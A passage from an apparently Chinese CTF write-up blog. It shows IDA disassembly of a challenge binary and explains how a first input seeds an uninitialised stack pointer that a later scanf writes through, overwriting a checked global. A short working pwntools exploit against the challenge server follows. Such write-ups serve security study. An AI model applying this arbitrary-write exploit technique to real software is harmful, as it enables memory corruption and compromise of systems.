class="selector-class">.text</span><span class="selector-pseudo">:000000000040076A</span>                 <span class="selector-tag">sub</span>     <span class="selector-tag">rsp</span>, 10<span class="selector-tag">h</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000040076E</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">edi</span>, <span class="selector-tag">offset</span> <span class="selector-tag">s</span>   ; "<span class="selector-tag">Input</span> <span class="selector-tag">your</span> <span class="selector-tag">name</span><span class="selector-pseudo">:"</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400773</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">puts</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400778</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rax</span>, <span class="selector-attr">[rbp+buf]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000040077C</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">edx</span>, 10<span class="selector-tag">h</span>        ; <span class="selector-tag">nbytes</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400781</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rsi</span>, <span class="selector-tag">rax</span>        ; <span class="selector-tag">buf</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400784</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">edi</span>, 0          ; <span class="selector-tag">fd</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400789</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">eax</span>, 0</span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000040078E</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">read</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400793</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rax</span>, <span class="selector-attr">[rbp+buf]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400797</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rsi</span>, <span class="selector-tag">rax</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000040079A</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">edi</span>, <span class="selector-tag">offset</span> <span class="selector-tag">format</span> ; "<span class="selector-tag">Hello</span>, %<span class="selector-tag">s</span>\<span class="selector-tag">n</span>"</span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000040079F</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">eax</span>, 0</span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000004007A4</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">printf</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000004007A9</span>                 <span class="selector-tag">nop</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000004007AA</span>                 <span class="selector-tag">leave</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000004007AB</span>                 <span class="selector-tag">retn</span></span><br></pre></td></tr></table></figure></p>
<p>输入地址是距离rbp为10的在栈上的位置，最大限度可以填0x10个</p>
<p>第二次：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007AC</span>                 <span class="built_in">push</span>    rbp</span><br><span class="line">.text:<span class="number">00000000004007AD</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004007B0</span>                 sub     rsp, 10h</span><br><span class="line">.text:<span class="number">00000000004007B4</span>                 mov     edi, offset aInputYourNumbe ; <span class="string">"Input your number:"</span></span><br><span class="line">.text:<span class="number">00000000004007B9</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000004007BE</span>                 mov     rax, [rbp+var_8]</span><br><span class="line">.text:<span class="number">00000000004007C2</span>                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">00000000004007C5</span>                 mov     edi, offset aLld ; <span class="string">"%lld"</span></span><br><span class="line">.text:<span class="number">00000000004007CA</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004007CF</span>                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">00000000004007D4</span>                 mov     edi, offset aThatSGood ; <span class="string">"That's good!"</span></span><br><span class="line">.text:<span class="number">00000000004007D9</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000004007DE</span>                 nop</span><br><span class="line">.text:<span class="number">00000000004007DF</span>                 leave</span><br><span class="line">.text:<span class="number">00000000004007E0</span>                 retn</span><br></pre></td></tr></table></figure>
<p>输入地址是距离rbp为8的栈上存储的位置，这个位置我们可以通过第一次输入控制，所以这里可以造成任意地址写，后面要进行判断的是0x60108c,那么我们就可以通过这两次输入来覆盖掉0x60108c原先的值，EXP：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="meta"># r = process(<span class="meta-string">"bug1_d96e92d3f6aff2674ea2673afd1d15d9"</span>)</span></span><br><span class="line">r = remote(<span class="string">"ctfgame.acdxvfsvd.net"</span>,<span class="number">11001</span>) </span><br><span class="line">token = <span class="string">"Wl9anMOc6jNZNZo0H53t448RpcSkRPuU"</span></span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line">payload = <span class="string">"w"</span>*<span class="number">8</span>+p64(<span class="number">0x60108c</span>)</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">"123"</span>)</span><br><span class="line"><span class="built_in">print</span> r.recvall()</span><br></pre></td></tr></table></figure>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
